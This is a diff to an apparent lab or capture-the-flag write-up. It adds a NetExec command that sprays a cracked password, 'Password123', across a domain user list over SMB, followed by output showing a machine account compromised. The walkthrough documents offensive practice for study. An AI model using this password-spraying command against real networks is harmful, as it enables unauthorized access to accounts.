@@ -244,5 +244,13 @@ The hash cracked, this was for the RID `1105` and that matches with the helpdesk
 It may also be worth spraying this password against all users too
 
 ```python
+nxc smb $target -u users.txt -p 'Password123' -k --continue-on-success
+
+SMB         dc.hsm-defense.local 445    dc               [+] hsm-defense.local\HELPDESK01$:Password123
+```
+
+The only account compromised was the machine account
+
+```python
 
 ```
